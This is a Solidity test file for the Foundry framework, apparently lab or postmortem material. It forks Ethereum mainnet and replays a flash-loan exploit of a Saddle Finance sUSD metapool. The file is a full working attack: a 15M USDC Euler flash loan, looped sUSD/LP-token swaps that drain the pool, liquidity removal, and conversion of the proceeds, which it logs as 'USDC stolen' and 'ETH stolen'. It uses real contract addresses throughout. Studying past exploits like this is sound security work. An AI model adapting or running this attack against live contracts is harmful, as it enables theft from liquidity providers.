// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IUniswapV2Pair {
    /**
     * Swaps tokens. For regular swaps, data.length must be 0.
     * Also see [Flash Swaps](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/flash-swaps).
     *
     */
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    /**
     * Returns the reserves of token0 and token1 used to price trades and distribute liquidity.
     * See Pricing[https://docs.uniswap.org/protocol/V2/concepts/advanced-topics/pricing].
     * Also returns the block.timestamp (mod 2**32) of the last block during which an interaction occured for the pair.
     *
     */
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IEuler {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IMetaSwap {
    function removeLiquidity(
        uint256 amount,
        uint256[] calldata minAmounts,
        uint256 deadline
    ) external returns (uint256[] memory);
}

contract MMonster is Test {
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant sUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    //DAI-USDC-PL
    address private constant saddleUSDV2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;

    address private constant eulerLoan = 0x07df2ad9878F8797B4055230bbAE5C808b8259b3;
    address private constant DAI_USDC_USDT_sUSD_curvePool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant USDC_WETH_uniswapPool = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant USDC_WETH_sushiswap = 0xC54fe427D161768ec1526804890902ebCD71c149;
    // address private constant DAI_USDC_USDT_curvePool =  0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant saddlepool = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    address private constant unknownMetaswap = 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;

    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 14_684_300);
        vm.prank(address(0));
        // console.log(IERC20(USDT).balanceOf(address(this)));
    }

    function testAttack() public {
        uint256 USDCBorrowed = 15_000_000e6;
        console.log("==========Setup===========");
        console.log("Borrowing USDC...");
        IEuler(eulerLoan).flashLoan(address(this), USDC, USDCBorrowed, new bytes(0));

        console.log("==========Result==========");
        console.log("USDC stolen: %s", IERC20(USDC).balanceOf(address(this)) / 1e6);
        console.log("Exchanging USDC to WETH...");
        IUniswapV2Router02 UNISWAP_ROUTER = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = WETH;
        IERC20(USDC).approve(address(UNISWAP_ROUTER), IERC20(USDC).balanceOf(address(this)));
        UNISWAP_ROUTER.swapExactTokensForTokens(
            IERC20(USDC).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        console.log("ETH stolen: %s", IERC20(WETH).balanceOf(address(this)) / 1e18);
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        attack2();
        IERC20(USDC).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack1() internal {
        uint256 amountUSDC = IERC20(USDC).balanceOf(address(this));
        console.log("USDC borrowed: %s", amountUSDC);
        console.log("Exchanging USDC to sUSD...");
        IERC20(USDC).approve(DAI_USDC_USDT_sUSD_curvePool, amountUSDC);
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(1, 3, amountUSDC, 1);
        uint256 amountsUSD = IERC20(sUSD).balanceOf(address(this));
        console.log("sUSD exchanged: %s", amountsUSD);

        console.log("==========Attack==========");

        for (uint256 index = 0; index < 2; index++) {
            happySwapOut(1, index, amountsUSD);
            happySwapIn(1, index, IERC20(saddleUSDV2).balanceOf(address(this)));
            console.log("==========================");
        }

        uint256 A = 10_000_000_000_000_000_000_000_000;
        for (uint256 index = 0; index < 2; index++) {
            happySwapOut(2, index, A);
            happySwapIn(2, index, IERC20(saddleUSDV2).balanceOf(address(this)));
            console.log("==========================");
        }

        console.log("Exchanging sUSD to USDC...");
        IERC20(sUSD).approve(DAI_USDC_USDT_sUSD_curvePool, IERC20(sUSD).balanceOf(address(this)));
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(3, 1, IERC20(sUSD).balanceOf(address(this)), 1);
        console.log("USDC Got: %s", IERC20(USDC).balanceOf(address(this)));
    }

    function attack2() internal {
        uint256 amountUSDC = IERC20(USDC).balanceOf(address(this));
        console.log("USDC borrowed: %s", amountUSDC);
        console.log("Exchanging USDC to sUSD...");
        IERC20(USDC).approve(DAI_USDC_USDT_sUSD_curvePool, amountUSDC);
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(1, 3, amountUSDC, 1);
        uint256 amountsUSD = IERC20(sUSD).balanceOf(address(this));
        console.log("sUSD exchanged: %s", amountsUSD);

        console.log("==========Attack==========");

        for (uint256 index = 0; index < 2; index++) {
            happySwapOut(1, index, amountsUSD);
            happySwapIn(1, index, IERC20(saddleUSDV2).balanceOf(address(this)));
            console.log("==========================");
        }

        uint256 A = 10_000_000_000_000_000_000_000_000;
        uint256 B = 6_000_000_000_000_000_000_000_000;

        happySwapOut(2, 0, B);
        console.log("==========================");
        for (uint256 index = 0; index < 2; index++) {
            uint256 get = happySwapOut(3, index, A);
            happySwapIn(3, index, get);
            console.log("==========================");
        }

        for (uint256 index = 0; index < 2; index++) {
            uint256 get = happySwapOut(4, index, B);
            happySwapIn(4, index, get);
            console.log("==========================");
        }

        for (uint256 index = 0; index < 4; index++) {
            uint256 get = happySwapOut(5, index, B * 3 / 4);
            happySwapIn(5, index, get);
            console.log("==========================");
        }

        // for (uint256 index = 0; index < 4; index++) {
        //     uint256 get = happySwapOut(6, index, B / 3);
        //     happySwapIn(6, index, get);
        //     console.log("==========================");
        // }

        console.log("Exchanging LP to other...");
        IERC20(saddleUSDV2).approve(unknownMetaswap, 2 ** 255);
        uint256[] memory min = new uint256[](3);
        min[0] = 0;
        min[1] = 0;
        min[2] = 0;
        IMetaSwap(unknownMetaswap).removeLiquidity(IERC20(saddleUSDV2).balanceOf(address(this)), min, block.timestamp);
        console.log("DAI: ", IERC20(DAI).balanceOf(address(this)));
        console.log("USDT: ", IERC20(USDT).balanceOf(address(this)));

        console.log("Exchanging sUSD to USDC...");
        IERC20(sUSD).approve(DAI_USDC_USDT_sUSD_curvePool, IERC20(sUSD).balanceOf(address(this)));
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(3, 1, IERC20(sUSD).balanceOf(address(this)), 1);
        console.log("USDC Got: %s", IERC20(USDC).balanceOf(address(this)));

        console.log("Exchanging DAI to USDC...");
        IERC20(DAI).approve(DAI_USDC_USDT_sUSD_curvePool, IERC20(DAI).balanceOf(address(this)));
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(0, 1, IERC20(DAI).balanceOf(address(this)), 1);
        console.log("USDC Got: %s", IERC20(USDC).balanceOf(address(this)));

        console.log("Exchanging USDT to USDC...");
        SafeERC20.forceApprove(IERC20(USDT), DAI_USDC_USDT_sUSD_curvePool, IERC20(USDT).balanceOf(address(this)));
        ICurve(DAI_USDC_USDT_sUSD_curvePool).exchange(2, 1, IERC20(USDT).balanceOf(address(this)), 1);
        console.log("USDC Got: %s", IERC20(USDC).balanceOf(address(this)));
    }

    function happySwapOut(uint256 round, uint256 index, uint256 amount) internal returns (uint256 X) {
        console.log("%s-[%s]-out", round, index);
        IERC20(sUSD).approve(saddlepool, IERC20(sUSD).balanceOf(address(this)));
        console.log("Swap sUSD to LPtoken...");
        X = ISaddle(saddlepool).swap(0, 1, amount, 1, block.timestamp);
        // ISaddle(saddlepool).swap(0, 1, 10_000_000e6, 1, block.timestamp);
        uint256 amountLPt = IERC20(saddleUSDV2).balanceOf(address(this));
        console.log("LPtoken got: %s", amountLPt);
    }

    function happySwapIn(uint256 round, uint256 index, uint256 amount) internal {
        console.log("%s-[%s]-in", round, index);
        console.log("Swap LPtoken to sUSD...");
        IERC20(saddleUSDV2).approve(saddlepool, IERC20(saddleUSDV2).balanceOf(address(this)));
        ISaddle(saddlepool).swap(1, 0, amount, 1, block.timestamp);
        uint256 amountsUSDafter = IERC20(sUSD).balanceOf(address(this));
        console.log("sUSD got: %s", amountsUSDafter);
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // some helper function, it is totally fine if you can finish the lab without using these function
    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    // safe mul is not necessary since https://docs.soliditylang.org/en/v0.8.9/080-breaking-changes.html
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }
}
